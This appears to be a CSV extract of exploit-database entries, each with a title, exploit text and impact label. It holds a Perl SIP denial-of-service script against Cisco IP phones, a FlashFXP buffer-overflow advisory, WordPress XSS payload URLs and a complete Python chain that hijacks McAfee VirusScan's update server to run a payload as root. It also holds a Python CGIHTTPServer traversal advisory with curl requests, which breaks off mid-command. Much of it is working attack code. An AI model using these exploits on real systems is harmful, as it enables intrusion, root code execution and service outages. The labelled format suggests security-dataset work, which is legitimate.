4297,"Cisco IP Phone 7940 - 3 SIP Messages Remote Denial of Service #!/usr/bin/perl use IO::Socket::INET;  die ""Usage $0 <dst> <port> <username>"" unless ($ARGV[2]);     $socket=new IO::Socket::INET->new(PeerPort=>$ARGV[1],          Proto=>'udp',          PeerAddr=>$ARGV[0]);     $msg = ""INVITE sip:$ARGV[2]\@$ARGV[0] SIP/2.0\r\nVia: SIP/2.0/UDP\t192.168.1.2;rport;branch=00\r\nFrom: <sip:gasparin\@192.168.1.2>;tag=00\r\nTo: <sip:$ARGV[2]\@$ARGV[0]>;tag=00\r\nCall-ID: et\@192.168.1.2\r\nCSeq: 10 INVITE\r\nContent-Length: 0\r\n\r\n"";;  $socket->send($msg);     sleep(1);  $msg =""OPTIONS sip:$ARGV[2]\@$ARGV[0] SIP/2.0\r\nVia: SIP/2.0/UDP 192.168.1.2;rport;branch=01\r\nFrom: <sip:gasparin\@192.168.1.2>;tag=01\r\nTo: <sip:$ARGV[2]\@$ARGV[0]>\r\nCall-ID: et\@192.168.1.2\r\nCSeq: 11 OPTIONS\r\nContent-Length: 0\r\n\r\n"";  $socket->send($msg);     sleep(1);  $msg =""OPTIONS sip:$ARGV[2]\@$ARGV[0] SIP/2.0\r\nVia: SIP/2.0/UDP 192.168.1.2;rport;branch=02\r\nFrom: <sip:gasparin\@192.168.1.2>;tag=02\r\nTo: <sip:$ARGV[2]\@$ARGV[0]>\r\nCall-ID: et\@192.168.1.2\r\nCSeq: 12 OPTIONS\r\nContent-Length: 0\r\n\r\n"";  $socket->send($msg);  # milw0rm.com [2007-08-21]",denial of service,1
18555,"FlashFXP 4.1.8.1701 - Remote Buffer Overflow Title: ====== FlashFXP v4.1.8.1701 - Buffer Overflow Vulnerability   Date: ===== 2012-03-01   References: =========== http://www.vulnerability-lab.com/get_content.php?id=462   VL-ID: ===== 462   Introduction: ============= FlashFXP is a FTP (File Transfer Protocol) client for Windows, it offers you easy and fast ways to transfer any file between other local  computers (LAN - Local Area Network) running a FTP server or via the Internet (WAN - Wide Area Network) and even directly between two  servers using Site to Site transfers (FXP - File eXchange Protocol). Use FlashFXP to publish and maintain your website, Upload and download  documents, photos, videos, music and more! Share your files with your friends and co-workers using the powerful site manager. There are many  features and advanced options available within FlashFXP which are being added with the release of each new version stable or beta*. The software  is available in over 20 languages and under active development. FlashFXP offers high security, performance, and reliability that you can always  depend on to get your job done swiftly and efficiently.  (Copy of the Vendor Homepage: http://www.flashfxp.com)   Abstract: ========= The Vulnerability Laboratory Research Team discovered a Buffer Overflow Vulnerability on FlashFXP v4.1.8.1701.   Report-Timeline: ================ 2012-02-27:	Vendor Notification 2012-02-28:	Vendor Response/Feedback 2012-03-01:	Public or Non-Public Disclosure   Status: ======== Published   Affected Products: ================== OpenSight Software Product: FlashFXP Software Client v4.1.8.1701   Exploitation-Technique: ======================= Local   Severity: ========= High   Details: ======== A Buffer Overflow Vulnerability is detected on FlashFXPs Software Client v4.1.8.1701. The vulnerability is  located when processing to force a ListIndex Out of Bound(s) exception which allows to overwrite ecx & eip  of the affected software process. Successful exploitation can result in process compromise, execution of  arbitrary code, system compromise or escaltions with privileges of affected vulnerable software process.  The flaw is a direct result of a fixed length buffer being used in the TListBox control and the  lack of range checking. The code assumes that the string returned by the listbox control will be  less than 4097 characters. It uses a fixed size buffer of 4096 bytes and any text longer than this  will overflow and overwrite the memory beyond it. The TComboBox control also suffers a similar flaw.  Vulnerable Module(s): 						[+] List Index & Exception Handling [TListBox]  Picture(s): 						../1.png 						../2.png 						../3.png 						../4.png 						../5.png   Proof of Concept: ================= The vulnerability can be exploited by local & remote attackers. For demonstration or reproduce ...  Manually reproduce ...  1. Download & open the software client 2. Connect to a random server for inter action 3. Enable the Option Settings => Filters => Skip-List 3. Open the Option => Filter Settings 4. Add a new (Skip-List)one by Including a large unicode string & wait for the exception-handling 5. The exception-handling out of bounds comes up 6. You pass it 2 times by clicking continue ... 7. The software is now crashing with a stable bex exception & displays input as offset[6] 8. Now you can overwrite the ecx & eip of the affected vulnerable software process to exploit the client system  Note: To exploit the bug (remote) an attacker needs to know the included filters of the connected client to send large strings.   --- Exception Error #1 --- date/time         : 2012-02-28, 16:38:58, 531ms computer name     : HOSTBUSTER user name         : Rem0ve operating system  : Windows 7 Tablet PC x64 Service Pack 1 build 7601 system language   : German system up time    : 5 days 13 hours program up time   : 7 minutes 2 seconds processors        : 2x Intel(R) Core(TM)2 Duo CPU T6600 @ 2.20GHz physical memory   : 2243/4091 MB (free/total) free disk space   : (C:) 207,54 GB display mode      : 1366x768, 32 bit process id        : $16fc allocated memory  : 50,75 MB executable        : FlashFXP.exe exec. date/time   : 2012-01-15 22:45 executable hash   : 34A53BD60479975EA6DAAB55B8D878B4 version           : 4.1.8.1701 ANSI code page    : 1252 callstack crc     : $1083d124, $c40af1d7, $90cfaf70 exception number  : 1 exception class   : EStringListError exception message : List index out of bounds (0).   --- Exception Error #2 --- date/time         : 2012-02-28, 16:39:57, 530ms computer name     : HOSTBUSTER user name         : Rem0ve operating system  : Windows 7 Tablet PC x64 Service Pack 1 build 7601 system language   : German system up time    : 5 days 13 hours program up time   : 8 minutes processors        : 2x Intel(R) Core(TM)2 Duo CPU T6600 @ 2.20GHz physical memory   : 2220/4091 MB (free/total) free disk space   : (C:) 207,54 GB display mode      : 1366x768, 32 bit process id        : $16fc allocated memory  : 66,67 MB executable        : FlashFXP.exe exec. date/time   : 2012-01-15 22:45 executable hash   : 34A53BD60479975EA6DAAB55B8D878B4 version           : 4.1.8.1701 ANSI code page    : 1252 callstack crc     : $b94d6925, $57f8c46d, $8f2c6734 exception number  : 2 exception class   : EStringListError exception message : List index out of bounds (0).   --- Exception BEX #3  (Overwrite) --- Version=1 EventType=BEX EventTime=129749175156198070 ReportType=2 Consent=1 ReportIdentifier=34b76897-6223-11e1-afbd-c4a714168486 IntegratorReportIdentifier=34b76896-6223-11e1-afbd-c4a714168486 WOW64=1 Response.type=4 Sig[0].Name=Anwendungsname Sig[0].Value=FlashFXP.exe Sig[1].Name=Anwendungsversion Sig[1].Value=4.1.8.1701 Sig[2].Name=Anwendungszeitstempel Sig[2].Value=2a425e19 Sig[3].Name=Fehlermodulname Sig[3].Value=StackHash_e98d Sig[4].Name=Fehlermodulversion Sig[4].Value=0.0.0.0 Sig[5].Name=Fehlermodulzeitstempel Sig[5].Value=00000000 Sig[6].Name=Ausnahmeoffset Sig[6].Value=41414141                   <= ECX | EIP  Sig[7].Name=Ausnahmecode Sig[7].Value=c0000005 Sig[8].Name=Ausnahmedaten Sig[8].Value=00000008 DynamicSig[1].Name=Betriebsystemversion DynamicSig[1].Value=6.1.7601.2.1.0.768.3 DynamicSig[2].Name=Gebietsschema-ID DynamicSig[2].Value=1031 DynamicSig[22].Name=Zusatzinformation 1 DynamicSig[22].Value=e98d DynamicSig[23].Name=Zusatzinformation 2 DynamicSig[23].Value=e98dfca8bcf81bc1740adb135579ad53 DynamicSig[24].Name=Zusatzinformation 3 DynamicSig[24].Value=6eab DynamicSig[25].Name=Zusatzinformation 4 DynamicSig[25].Value=6eabdd9e0dc94904be3b39a1c0583635 UI[2]=C:\Program Files (x86)\FlashFXP 4\FlashFXP.exe UI[3]=FlashFXP funktioniert nicht mehr UI[4]=Windows kann online nach einer L�sung f�r das Problem suchen. UI[5]=Online nach einer L�sung suchen und das Programm schlie�en UI[6]=Sp�ter online nach einer L�sung suchen und das Programm schlie�en UI[7]=Programm schlie�en ... FriendlyEventName=Nicht mehr funktionsf�hig ConsentKey=BEX AppName=FlashFXP AppPath=C:\Program Files (x86)\FlashFXP 4\FlashFXP.exe   Reference(s): 			../AppCrash_FlashFXP.exe_cb63a668207dbeae0f33144dffb1e66eae843_0a310ac0 			../AppCrash_FlashFXP.exe_cb63a668207dbeae0f33144dffb1e66eae843_07c4b531 			../bugreport1.txt 			../bugreport2.txt 			../video-poc-demo.wmv   Risk: ===== The security risk of the buffer overflow vulnerability is estimated as high(-).   Credits: ======== Vulnerability Research Laboratory  -  Benjamin Kunz Mejri   Disclaimer: =========== The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties,  either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability- Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business  profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some  states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation  may not apply. Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability- Lab. Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of  other media, are reserved by Vulnerability-Lab or its suppliers.      						Copyright � 2012|Vulnerability-Lab  --  Website: www.vulnerability-lab.com ; vuln-lab.com or vuln-db.com Contact: admin@vulnerability-lab.com or support@vulnerability-lab.com",overwrite ecx & eip of the affected software process,1
37836,WordPress Plugin Token Manager - 'tid' Cross-Site Scripting source: https://www.securityfocus.com/bid/55664/info  The Token Manager plugin for WordPress is prone to a cross-site-scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.  Token Manager 1.0.2 is vulnerable; other versions may also be affected.   http://www.example.com/wp-admin/admin.php?page=tokenmanageredit&tid=<script>alert(document.cookie);</script> http://www.example.com/wp-admin/admin.php?page=tokenmanagertypeedit&tid=<script>alert(document.cookie);</script>,execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site,1
40911,"McAfee Virus Scan Enterprise for Linux 1.9.2 < 2.0.2 - Remote Code Execution ''' Source: https://nation.state.actor/mcafee.html  Vulnerabilities  CVE-2016-8016: Remote Unauthenticated File Existence Test CVE-2016-8017: Remote Unauthenticated File Read (with Constraints) CVE-2016-8018: No Cross-Site Request Forgery Tokens CVE-2016-8019: Cross Site Scripting CVE-2016-8020: Authenticated Remote Code Execution & Privilege Escalation CVE-2016-8021: Web Interface Allows Arbitrary File Write to Known Location CVE-2016-8022: Remote Use of Authentication Tokens CVE-2016-8023: Brute Force Authentication Tokens CVE-2016-8024: HTTP Response Splitting CVE-2016-8025: Authenticated SQL Injection When chaned together, these vulnerabilities allow a remote attacker to execute code as root. ''' #!/bin/python3 import time import requests import os import sys import re import threading import subprocess from http.server import BaseHTTPRequestHandler, HTTPServer from socketserver import ThreadingMixIn  # Per-target configuration target_domain=""https://10.0.1.130"" # https://target_ip local_ip = '10.0.1.128'                 # Attacker IP for victim to connect back to authorized_ip=""127.0.0.1""           # IP address cookie will be valid for update_server_port = 8080               # Port update server listens on delay_seconds = 10                      # How long should the server take to serve the update target_port = 55443                 # Port to target  # Put payload script in payload.sh  # Initialization payload_in_place = threading.Event() requests.packages.urllib3.disable_warnings() with open(""payload.sh"", ""r"") as f:     payload = f.read()  def pprint(inp, flag=False):     pad = ""#""     if flag:         pad = ""*""     print(""\n"" + pad+ "" "" + inp)   def crack_cookie():     pprint(""Cracking Cookie"")      # A page that requires authentication     url = target_domain + "":"" + str(target_port) + ""/0409/nails?pg=proxy&tplt=productUpdate.html""      # Start at the current time + 100 in case of recent login with clock skew     date_val = int(time.time()+100)     cookie_fmt = authorized_ip+""/n/0/%d-checksum// ""+authorized_ip + "" ""*20      # Make requests, print after every 600     while True:         cookie = cookie_fmt % date_val         req_cookie = {""nailsSessionId"": cookie}         r = requests.get(url, cookies=req_cookie, verify=False)         r.raise_for_status()          if ""Set-Cookie"" in r.headers:             valid_cookie = cookie             timestamp = cookie.split(""/"")[3].split(""-"")[0]             break          elif date_val % 600 == 0:             print(""Now trying  %s"" % time.asctime(time.localtime(date_val)))          date_val -= 1      pprint(""Cookie Cracked: "" + timestamp, True)     return valid_cookie   def update_update_server(auth_cookie):     pprint(""Updating update server"")      # Replace McAfeeHttp update server with attacker local_ip:update_server_port     url = target_domain + "":"" + str(target_port) + ""/0409/nails?pg=proxy&addr=127.0.0.1%3A65443&tplt="" \     ""repository.html&sitelist=add&mon%3A0=db+set+1+_table%3Drepository+status%3D1+siteList%3D%253C%253F"" \     ""xml%2520version%253D%25221.0%2522%2520encoding%253D%2522UTF-8%2522%253F%253E%250A%253Cns%253ASiteLists"" \     ""%2520xmlns%253Ans%253D%2522naSiteList%2522%2520GlobalVersion%253D%2522PATTeELCQSEhZwxKf4PoXNSY4%2Fg%25"" \     ""3D%2522%2520LocalVersion%253D%2522Wed%252C%252030%2520Dec%25202009%252011%253A20%253A59%2520UTC%2522%2"" \     ""520Type%253D%2522Client%2522%253E%253CPolicies%2F%253E%253CSiteList%2520Default%253D%25221%2522%2520Na"" \     ""me%253D%2522SomeGUID%2522%253E%253CHttpSite%2520Type%253D%2522repository%2522%2520Name%253D%2522McAfee"" \     ""Http%2522%2520Order%253D%25221%2522%2520Server%253D%2522""+local_ip+""%253A""+str(update_server_port) \     + ""%2522%2520Enabled%253D%25221%2522%2520Local%253D%25221%2522%253E%253CRelativePath%2F%253E%253CUseAuth%"" \     ""253E0%253C%2FUseAuth%253E%253CUserName%253E%253C%2FUserName%253E%253CPassword%2520Encrypted%253D%25220"" \     ""%2522%2F%253E%253C%2FHttpSite%253E%253CFTPSite%2520Type%253D%2522fallback%2522%2520Name%253D%2522McAfe"" \     ""eFtp%2522%2520Order%253D%25222%2522%2520Server%253D%2522ftp.nai.com%253A21%2522%2520Enabled%253D%25221"" \     ""%2522%2520Local%253D%25221%2522%253E%253CRelativePath%253ECommonUpdater%253C%2FRelativePath%253E%253CU"" \     ""seAuth%253E1%253C%2FUseAuth%253E%253CUserName%253Eanonymous%253C%2FUserName%253E%253CPassword%2520Encr"" \     ""ypted%253D%25221%2522%253ECommonUpdater%40McAfeeB2B.com%253C%2FPassword%253E%253C%2FFTPSite%253E%253C%"" \     ""2FSiteList%253E%253C%2Fns%253ASiteLists%253E+_cmd%3Dupdate+&mon%3A1=task+setsitelist&mon%3A2=db+select"" \     ""+_show%3DsiteList+_show%3Dstatus+_table%3Drepository&info%3A2=multi%2Cshow&reposProperty=repository&re"" \     ""posProperty=fallback&useOfProxy=on""      r = requests.get(url, cookies=auth_cookie, verify=False)     r.raise_for_status()     pprint(""Updated update server"", True)  def download_update(req_cookie):     pprint(""Requesting target download payload"")      # Send request to make target download payload     url = target_domain + "":"" + str(target_port) + ""/0409/nails""      updateName = ""update_%d"" % int(time.time())     postdata = (""pg=proxy&addr=127.0.0.1%3A65443&tplt=scheduledTasks.html&scheduleOp=add&mon%3A0=db+set+1+_tab"" \     ""le%3Dschedule++taskName%3D{0}+taskType%3DUpdate+taskInfo%3DtoUpdate%3Ddat%253Bengine+timetable%3Dtype%"" \     ""3Dunscheduled+status%3DIdle++i_recurrenceCounter%3D0+&mon%3A1=task+nstart+{0}&mon%3A2=db+select+_asc%3D"" \     ""taskName+_table%3Dschedule+_show%3Di_taskId+_show%3DtaskName+_show%3DtaskResults+_show%3Dtimetable+_sh"" \     ""ow%3DtaskType+_show%3DtaskInfo+_show%3Di_lastRun+_show%3D%24i_lastRun+_show%3Dstatus+_show%3Dprogress+"" \     ""_show%3Di_nextRun+_show%3D%24i_nextRun+_show%3Di_duration+_show%3DtaskInfo++_limit%3D50+_offset%3D0&in"" \     ""fo%3A2=multi%2Cshow&mon%3A3=db+select+_table%3Dschedule+_show%3Dcount%28*%29&info%3A3=multi%2Cshow&loc"" \     ""%3A4=conf+get+browser.resultsPerPage&info%3A4=multi%2Cshow&mon%3A5=task+updatecrontab&info%3A5=multi%2"" \     ""Cshow&echo%3A6=1&info%3A6=pageNo&echo%3A7=&info%3A7=selectedTask"""""").format(updateName)      headers = {'Content-Type': 'application/x-www-form-urlencoded'}     r = requests.post(url, data=postdata, cookies=req_cookie, verify=False, headers=headers)     r.raise_for_status()      pprint(""Payload download requested"", 1)   def exec_catalogz(req_cookie):     pprint(""Making target execute payload"")      #### Get commit_id and ODS_name     url = target_domain + "":"" + str(target_port) + ""/0409/nails?pg=proxy&tplt=schedOnDemand.html&addr=127.0"" \     "".0.1:65443&mon:0=sconf+ODS+select+section%3Dnailsd.profile.ODS&info:0=multi,show,digest&echo:1=ODS&inf"" \     ""o:1=profileName&mon:2=sconf+ODS+select+section%3Dnailsd.profile.ODS_default&info:2=multi,show&echo:3=O"" \     ""DS_default&info:3=defaultProfileName&mon:4=sconf+ODS+select+attribute%3Dnailsd.oasEnabled&info:4=multi"" \     "",show&mon:5=extensions&info:5=multi,show&mon:6=db+select+_show=max(i_taskId)+_table=schedule&info:6=mu"" \     ""lti,show&mon:7=utco&info:7=single,show,serverUtcOffset&echo:8=generate&info:8=profileNameAction""      r = requests.get(url, cookies=req_cookie, verify=False)     r.raise_for_status()      regex = re.search(""\|digest=(.+?)\|"", r.text)     if not regex:         print(""\nERROR: Could not get commit_id when generating evil scan\n"")         return False      commit_id = regex.groups(1)[0]      # Send request to start evil scan     payload_path = ""%2Fopt%2FMcAfee%2Fcma%2Fscratch%2Fupdate%2Fcatalog.z""     binary_path = ""%2Fbin%2Fsh"" # Use ""%2fbin%2Fstatic-sh"" for versions 1.x      url = target_domain + "":"" + str(target_port) + ""/0409/nails""      ODS_name = ""ODS_1""   # This may need to be increased if the name already exists     scan_name = ""scan_%s"" % str(int(time.time()))      postdata =  (""pg=proxy&addr=127.0.0.1%3A65443&tplt=scheduledTasks.html&mon%3A0=sconf+{1}+begin&info%3A0="" \     ""multi%2Cshow&mon%3A1=sconf+{1}+delete+{0}+section%3Dnailsd.profile.{1}.filter+section%3Dnailsd.prof"" \     ""ile.{1}.action&mon%3A2=sconf+{1}+set+{0}+nailsd.profile.{1}.allFiles%3Dtrue+nailsd.profile.{1}.child"" \     ""InitTmo%3D240+nailsd.profile.{1}.cleanChildren%3D2+nailsd.profile.{1}.cleansPerChild%3D10000+nailsd"" \     "".profile.{1}.datPath%3D%2Fopt%2FNAI%2FLinuxShield%2Fengine%2Fdat+nailsd.profile.{1}.decompArchive%3"" \     ""Dtrue+nailsd.profile.{1}.decompExe%3Dtrue+nailsd.profile.{1}.engineLibDir%3D%2Fopt%2FNAI%2FLinuxShi"" \     ""eld%2Fengine%2Flib+nailsd.profile.{1}.enginePath%3D{3}+nailsd.profile.{1}.factoryI"" \     ""nitTmo%3D240+nailsd.profile.{1}.heuristicAnalysis%3Dtrue+nailsd.profile.{1}.macroAnalysis%3Dtrue+na"" \     ""ilsd.profile.{1}.maxQueSize%3D32+nailsd.profile.{1}.mime%3Dtrue+nailsd.profile.{1}.noJokes%3Dfalse+"" \     ""nailsd.profile.{1}.program%3Dtrue+nailsd.profile.{1}.quarantineChildren%3D1+nailsd.profile.{1}.quar"" \     ""antineDirectory%3D%2Fquarantine+nailsd.profile.{1}.quarantineFromRemoteFS%3Dfalse+nailsd.profile.{1"" \     ""}.quarantinesPerChild%3D10000+nailsd.profile.{1}.scanChildren%3D2+nailsd.profile.{1}.scanMaxTmo%3D3"" \     ""00+nailsd.profile.{1}.scanNWFiles%3Dfalse+nailsd.profile.{1}.scanOnRead%3Dtrue+nailsd.profile.{1}.s"" \     ""canOnWrite%3Dtrue+nailsd.profile.{1}.scannerPath%3D{4}+nailsd.profile.{1}.scansPerChild"" \     ""%3D10000+nailsd.profile.{1}.slowScanChildren%3D0+nailsd.profile.{1}.filter.0.type%3Dexclude-path+na"" \     ""ilsd.profile.{1}.filter.0.path%3D%2Fproc+nailsd.profile.{1}.filter.0.subdir%3Dtrue+nailsd.profile.{"" \     ""1}.filter.1.type%3Dexclude-path+nailsd.profile.{1}.filter.1.path%3D%2Fquarantine+nailsd.profile.{1}"" \     "".filter.1.subdir%3Dtrue+nailsd.profile.{1}.filter.extensions.mode%3Dall+nailsd.profile.{1}.filter.e"" \     ""xtensions.type%3Dextension+nailsd.profile.{1}.action.Default.primary%3DClean+nailsd.profile.{1}.act"" \     ""ion.Default.secondary%3DQuarantine+nailsd.profile.{1}.action.App.primary%3DClean+nailsd.profile.{1}"" \     "".action.App.secondary%3DQuarantine+nailsd.profile.{1}.action.timeout%3DPass+nailsd.profile.{1}.acti"" \     ""on.error%3DBlock&mon%3A3=sconf+{1}+commit+{0}&mon%3A4=db+set+{0}+_table%3Dschedule++taskName%3D{2}+"" \     ""taskType%3DOn-Demand+taskInfo%3DprofileName%3D{1}%2Cpaths%3Dpath%3A%2Ftmp%3Bexclude%3Atrue+timetabl"" \     ""e%3Dtype%3Dunscheduled+progress%3D+status%3DIdle+&mon%3A5=task+nstart+{2}&mon%3A6=db+select+_asc%3D"" \     ""taskName+_table%3Dschedule+_show%3Di_taskId+_show%3DtaskName+_show%3DtaskResults+_show%3Dtimetable+"" \     ""_show%3DtaskType+_show%3DtaskInfo+_show%3Di_lastRun+_show%3D%24i_lastRun+_show%3Dstatus+_show%3Dpro"" \     ""gress+_show%3Di_nextRun+_show%3D%24i_nextRun+_show%3Di_duration+_show%3DtaskInfo++_limit%3D50+_offs"" \     ""et%3D0&info%3A6=multi%2Cshow&mon%3A7=db+select+_table%3Dschedule+_show%3Dcount%28*%29&info%3A7=mult"" \     ""i%2Cshow&mon%3A8=sconf+ODS+begin&info%3A8=multi%2Cshow%2Cdigest&mon%3A9=task+updatecrontab&info%3A9"" \     ""=multi%2Cshow&loc%3A10=conf+get+browser.resultsPerPage&info%3A10=multi%2Cshow&echo%3A11=1&info%3A11"" \     ""=pageNo&echo%3A12=&info%3A12=selectedTask"").format(commit_id, ODS_name, scan_name,payload_path, binary_path)      headers = {'Content-Type': 'application/x-www-form-urlencoded'}     r = requests.post(url, data=postdata, cookies=req_cookie, verify=False, headers=headers)     r.raise_for_status()      pprint(""Payload executed"", 1)  def start_update_server():      class RequestHandler(BaseHTTPRequestHandler):         def do_HEAD(s):             s.send_response(200)             s.send_header(""Content-type"", ""text/html"")             s.end_headers()          def do_GET(s):             if s.path == ""/catalog.z"":                 s.send_response(200)                 s.send_header(""Content-type"", ""text/html"")                 s.end_headers()                 s.wfile.write(bytes(payload, ""utf-8""))                  pprint(""Payload placed"", 1)                  payload_in_place.set()                  # Die after sending payload so we send an incomplete response                 raise KillServer              else: # Assume all other requests are for SiteStat - Always increasing version                 s.send_response(200)                 s.send_header(""Content-type"", ""text/xml"")                 s.end_headers()                 s.wfile.write(bytes((""""""<?xml version=""1.0"" encoding=""UTF-8""?>"""""" \                 """"""<SiteStatus Status=""Enabled"" CatalogVersion=""2%d"">"""""" \                 """""" </SiteStatus>"""""") % int(time.time()), ""utf-8""))      # Throwing KillServer will shutdown the server ungracefully     class KillServer(Exception):         def __str__(self):             return ""Kill Server (not an error)""      # ThreadingMixIn plus support for KillServer exceptions     class AbortableThreadingMixIn(ThreadingMixIn):         def process_request_thread(self, request, client_address):             try:                 self.finish_request(request, client_address)                 self.shutdown_request(request)             except KillServer:                 pprint(""Killing update server dirtily"")                 self.shutdown_request(request)                 self.shutdown() # Only if we want to shutdown             except:                 self.handle_error(request, client_address)                 self.shutdown_request(request)       class BackgroundHTTPSrv(AbortableThreadingMixIn, HTTPServer):         pass      pprint(""Launching update server"")      srv = BackgroundHTTPSrv((local_ip, update_server_port), RequestHandler)     threading.Thread(target=srv.serve_forever).start()      pprint(""Update server started"", 1)     return srv   #################################################################################### ####################################################################################  pprint(""Attacking %s"" % target_domain, 1)  # Crack the auth cookie cookie = crack_cookie() auth_cookie = {""nailsSessionId"": cookie}  # Start our update server locally srv = start_update_server()  # Force target to use our update server update_update_server(auth_cookie)  # Make target download an update from us download_update(auth_cookie)  # Block until the target downloads our payload, payload_in_place.wait()  # Shutdown our update server srv.shutdown()  # Execute /bin/sh -(?) catalog.z exec_catalogz(auth_cookie)",execute code as root,1
33894,"Python CGIHTTPServer - Encoded Directory Traversal Advisory: Python CGIHTTPServer File Disclosure and Potential Code           Execution  The CGIHTTPServer Python module does not properly handle URL-encoded path separators in URLs. This may enable attackers to disclose a CGI script's source code or execute arbitrary CGI scripts in the server's document root.  Details =======  Product: Python CGIHTTPServer Affected Versions:   2.7 - 2.7.7,   3.2 - 3.2.4,   3.3 - 3.3.2,   3.4 - 3.4.1,   3.5 pre-release Fixed Versions:   2.7 rev b4bab0788768,   3.2 rev e47422855841,   3.3 rev 5676797f3a3e,   3.4 rev 847e288d6e93,   3.5 rev f8b3bb5eb190 Vulnerability Type: File Disclosure, Directory Traversal, Code Execution Security Risk: high Vendor URL: https://docs.python.org/2/library/cgihttpserver.html Vendor Status: fixed version released Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2014-008 Advisory Status: published CVE: CVE-2014-4650 CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-4650   Introduction ============  The CGIHTTPServer module defines a request-handler class, interface compatible with BaseHTTPServer. BaseHTTPRequestHandler and inherits behavior from SimpleHTTPServer. SimpleHTTPRequestHandler but can also run CGI scripts.  (from the Python documentation)   More Details ============  The CGIHTTPServer module can be used to set up a simple HTTP server with CGI scripts. A sample server script in Python may look like the following:  ------------------------------------------------------------------------ #!/usr/bin/env python2  import CGIHTTPServer import BaseHTTPServer  if __name__ == ""__main__"":     server = BaseHTTPServer.HTTPServer     handler = CGIHTTPServer.CGIHTTPRequestHandler     server_address = ("""", 8000)     # Note that only /cgi-bin will work:     handler.cgi_directories = [""/cgi-bin"", ""/cgi-bin/subdir""]     httpd = server(server_address, handler)     httpd.serve_forever() ------------------------------------------------------------------------  This server should execute any scripts located in the subdirectory ""cgi-bin"". A sample CGI script can be placed in that directory, for example a script like the following:  ------------------------------------------------------------------------ #!/usr/bin/env python2 import json import sys  db_credentials = ""SECRET"" sys.stdout.write(""Content-type: text/json\r\n\r\n"") sys.stdout.write(json.dumps({""text"": ""This is a Test""})) ------------------------------------------------------------------------  The Python library CGIHTTPServer.py implements the CGIHTTPRequestHandler class which inherits from SimpleHTTPServer.SimpleHTTPRequestHandler:  class SimpleHTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler): [...]     def do_GET(self):         """"""Serve a GET request.""""""         f = self.send_head()         if f:             try:                 self.copyfile(f, self.wfile)             finally:                 f.close()      def do_HEAD(self):         """"""Serve a HEAD request.""""""         f = self.send_head()         if f:             f.close()      def translate_path(self, path):     [...]         path = posixpath.normpath(urllib.unquote(path))         words = path.split('/')         words = filter(None, words)         path = os.getcwd()         [...]  The CGIHTTPRequestHandler class inherits, among others, the methods do_GET() and do_HEAD() for handling HTTP GET and HTTP HEAD requests. The class overrides send_head() and implements several new methods, such as do_POST(), is_cgi() and run_cgi():  class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler): [...]     def do_POST(self):         [...]         if self.is_cgi():             self.run_cgi()         else:             self.send_error(501, ""Can only POST to CGI scripts"")      def send_head(self):         """"""Version of send_head that support CGI scripts""""""         if self.is_cgi():             return self.run_cgi()         else:             return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)      def is_cgi(self):         [...]         collapsed_path = _url_collapse_path(self.path)         dir_sep = collapsed_path.find('/', 1)         head, tail = collapsed_path[:dir_sep], collapsed_path[dir_sep+1:]         if head in self.cgi_directories:             self.cgi_info = head, tail             return True         return False [...]     def run_cgi(self):         """"""Execute a CGI script.""""""         dir, rest = self.cgi_info          [...]          # dissect the part after the directory name into a script name &         # a possible additional path, to be stored in PATH_INFO.         i = rest.find('/')         if i >= 0:             script, rest = rest[:i], rest[i:]         else:             script, rest = rest, ''          scriptname = dir + '/' + script         scriptfile = self.translate_path(scriptname)         if not os.path.exists(scriptfile):             self.send_error(404, ""No such CGI script (%r)"" % scriptname)             return         if not os.path.isfile(scriptfile):             self.send_error(403, ""CGI script is not a plain file (%r)"" %                             scriptname)             return         [...] [...]  For HTTP GET requests, do_GET() first invokes send_head(). That method calls is_cgi() to determine whether the requested path is to be executed as a CGI script. The is_cgi() method uses _url_collapse_path() to normalize the path, i.e. remove extraneous slashes (/),current directory (.), or parent directory (..) elements, taking care not to permit directory traversal below the document root. The is_cgi() function returns True when the first path element is contained in the cgi_directories list. As _url_collaps_path() and is_cgi() never URL decode the path, replacing the forward slash after the CGI directory in the URL to a CGI script with the URL encoded variant %2f leads to is_cgi() returning False. This will make CGIHTTPRequestHandler's send_head() then invoke its parent's send_head() method which translates the URL path to a file system path using the translate_path() method and then outputs the file's contents raw. As translate_path() URL decodes the path, this then succeeds and discloses the CGI script's file contents:  $ curl http://localhost:8000/cgi-bin%2ftest.py #!/usr/bin/env python2 import json import sys  db_credentials = ""SECRET"" sys.stdout.write(""Content-type: text/json\r\n\r\n"") sys.stdout.write(json.dumps({""text"": ""This is a Test""}))  Similarly, the CGIHTTPRequestHandler can be tricked into executing CGI scripts that would normally not be executable. The class normally only allows executing CGI scripts that are direct children of one of the directories listed in cgi_directories. Furthermore, only direct subdirectories of the document root (the current working directory) can be valid CGI directories.  This can be seen in the following example. Even though the sample server shown above includes ""/cgi-bin/subdir"" as part of the request handler's cgi_directories, a CGI script named test.py in that directory is not executed:  $ curl http://localhost:8000/cgi-bin/subdir/test.py [...] <p>Error code 403. <p>Message: CGI script is not a plain file ('/cgi-bin/subdir'). [...]  Here, is_cgi() set self.cgi_info to ('/cgi-bin', 'subdir/test.py') and returned True. Next, run_cgi() further dissected these paths to perform some sanity checks, thereby mistakenly assuming subdir to be the executable script's filename and test.py to be path info. As subdir is not an executable file, run_cgi() returns an error message. However, if the forward slash between subdir and test.py is replaced with %2f, invoking the script succeeds:  $ curl http://localhost:8000/cgi-bin/subdir%2ftest.py {""text"": ""This is a Test""}  This is because neither is_cgi() nor run_cgi() URL decode the path during processing until run_cgi() tries to determine whether the target script is an executable file. More specifically, as subdir%2ftest.py does not contain a forward slash, it is not split into the script name subdir and path info test.py, as in the previous example.  Similarly, using URL encoded forward slashes, executables outside of a CGI directory can be executed:  $ curl 